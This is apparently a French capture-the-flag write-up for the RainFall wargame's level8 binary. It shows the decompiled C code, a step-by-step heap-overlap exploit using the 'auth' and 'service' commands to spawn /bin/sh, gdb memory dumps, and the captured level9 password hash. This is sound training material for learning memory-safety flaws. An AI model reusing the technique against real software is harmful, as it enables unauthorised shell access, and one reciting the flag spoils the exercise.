Read also: [./Resources/README.md](./Resources/README.md)

# Source

https://dogbolt.org/?id=c81dd233-7ccb-4ab8-8074-27857c96eb14

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char input[128];

  while (1)
  {
    printf("%p, %p \n", auth, (const void *)service);

    if (!fgets(input, 128, stdin)) // => getline
      break;

    if (!memcmp(input, "auth ", 5))
    {
      auth = (char *)malloc(16);
      *auth = 0;
      if (strlen(&input[5]) <= 30)
        strcpy(auth, &input[5]);
    }

    if (!memcmp(input, "reset", 5))
      free(auth);

    if (!memcmp(input, "service", 6))
      service = (char *) strdup(&input[7]);

    if (!memcmp(input, "login", 5))
    {
      if (((char *) auth)[32])
        system("/bin/sh");
      else
        fwrite("Password:\n", 1, 10, stdout);
    }
  }
  return 0;
}
```

# Explication

Le but de cet exo est de faire en sorte que la valeur de la variable service colle avec `auth[32]`
pour retourner vrai dans la condition de la commande `login`. Etant donné que la commande `auth` est
limitée à 30 caractères, on doit utiliser `service` en deuxième (après que auth soit initialisé)
pour définir `((char *)auth)[32]`.

`service` va écrire par dessus la fin de `auth`, c'est comme ça qu'on arrive à écrire à `auth[32]`.

Donc :

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth my name is guillaume
0x804a008, (nil)
service j'espere reussir du premier coup!
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

```
(gdb) x/21c auth
0x804a008:    109 'm'    121 'y'    32 ' '    110 'n'    97 'a'    109 'm'    101 'e'    32 ' '
0x804a010:    105 'i'    115 's'    32 ' '    103 'g'    117 'u'   105 'i'    108 'l'    108 'l'
0x804a018:    97 'a'    117 'u'    109 'm'    101 'e'    10 '\n'
```

```
(gdb) x/21c auth
0x804a008:    109 'm'    121 'y'    32 ' '    110 'n'    97 'a'    109 'm'    101 'e'    32 ' '
0x804a010:    105 'i'    115 's'    32 ' '    103 'g'    41 ')'    0 '\0'     0 '\0'     0 '\0'
0x804a018:    32 ' '    106 'j'    39 '\''    101 'e'    115 's'
```

On a donc réussi à lancer shell et obtenir le flag :
```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
